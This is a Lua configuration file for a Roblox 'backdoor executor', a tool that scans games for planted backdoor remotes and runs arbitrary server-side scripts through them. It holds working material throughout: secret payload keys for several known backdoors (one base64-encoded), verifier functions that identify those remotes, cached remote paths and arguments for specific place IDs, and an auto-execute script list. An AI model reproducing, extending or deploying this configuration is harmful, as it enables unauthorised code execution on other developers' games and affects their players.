-- objects
local player = game:GetService("Players").LocalPlayer

-- main
return {
	["configVer"] = 6, -- don't touch this!
	-- @tweaks
	["redirectOutput"] = false, -- [BETA] redirects output to console
	["redirectRemote"] = false, -- [BETA] uses a custom remote for server-side execution

	-- @customization
	-- $scripts that executes after backdoor is found
	-- $you can add any scripts here
	["autoExec"] = {
		[[print("backdoor-executor.lua is epic!")]],
	},

	-- $remote filters that you don't want to be scanned
	-- $should be thread-safe
	["remoteFilters"] = {
		["AdminRemotes"] = function(remoteObj)
			local remoteObjPath = remoteObj:GetFullName()

			return remoteObj:IsDescendantOf(game:GetService("ReplicatedStorage")) and (string.find(remoteObjPath, "HDAdminClient") or string.find(remoteObjPath, "Basic Admin Essentials"))
		end,
		["AdonisRemotes"] = function(remoteObj)
			return (
				(remoteObj.Parent and remoteObj.Parent:IsA("ReplicatedStorage") and remoteObj:FindFirstChild("__FUNCTION")) or
				(remoteObj.Name == "__FUNCTION" and remoteObj.Parent:IsA("RemoteEvent") and remoteObj.Parent.Parent:IsA("ReplicatedStorage"))
			)
		end,
		["RespawnRemotes"] = function(remoteObj)
			local remoteObjName = string.lower(remoteObj.Name)

			return (string.find(remoteObjName, "respawn"))
		end,
		["SkidCannonRemotes"] = function(remoteObj)
			local remoteObjPath = remoteObj:GetFullName()

			return (string.find(remoteObjPath, "JointsService") and (string.find(remoteObjPath, "Lightning Cannon") or string.find(remoteObjPath, " Cannon")))
		end,
		["RobloxReplicatedStorage"] = function(remoteObj)
			return remoteObj:IsDescendantOf(game:GetService("RobloxReplicatedStorage"))
		end,
	},

	-- $any prefixed shenanigans you can add here
	-- $prefixed as "%macro%" | example: %username% -> "Roblox", %plr_pos% -> Vector3
	["scriptMacros"] = {
		["username"] = player.Name,
		["userid"] = player.UserId,
		["placeid"] = game.PlaceId
	},

	-- $backdoor payloads
	["backdoorPayloads"] = {
		["default"] = {
			["Payload"] = {"source"},
		},

		-- payloads below are from github.com/L1ghtingBolt/FraktureSS
		["helpmeRemote"] = {
			["Payload"] = {"helpme", "source"},
		},
		["pickettRemote"] = {
			["Payload"] = {"cGlja2V0dA==", "source"},
		},
		["runSSRemote"] = {
			["Payload"] = {"5#lGIERKWEF", "source"},
			["Verifier"] = function(remoteObj)
				local remoteParent = remoteObj.Parent
				return (remoteObj.Name == "Run" and remoteParent) and (
					remoteParent:FindFirstChild("Pages") and remoteParent:FindFirstChild("R6") and
					remoteParent:FindFirstChild("Version") and remoteParent:FindFirstChild("Title")
				)
			end
		},
		["emmaSSRemote"] = {
			["Payload"] = {"pwojr8hoc0-gr0yxohlgp-0feb7ncxed", ",,,,,,,,,,,,,,,", "source"},
			["Verifier"] = function(remoteObj)
				local remoteParent = remoteObj.Parent
				return (remoteObj.Name == "emma" and remoteParent) and (
					remoteParent.Name == "mynameemma" and
					remoteParent:IsDescendantOf(game:GetService("ReplicatedStorage"))
				)
			end
		},
	},

	-- $cached backdoor remotes
	["cachedPlaces"] = {
		[5033592164] = {
			["Path"] = game.PlaceId == 5033592164 and game:GetService("ReplicatedStorage"):FindFirstChildWhichIsA("RemoteEvent"):GetFullName(),
			["Args"] = {"1234567890", "source"}
		},
		[6879465970] = {
			["Path"] = "ReplicatedStorage.RemoteEvent",
			["Args"] = {"source"}
		},
		[6664139112] = {
			["Path"] = "ReplicatedStorage.Core.Communication.RemoteEvent",
			["Args"] = {"Execute", "source"}
		},
	},
}
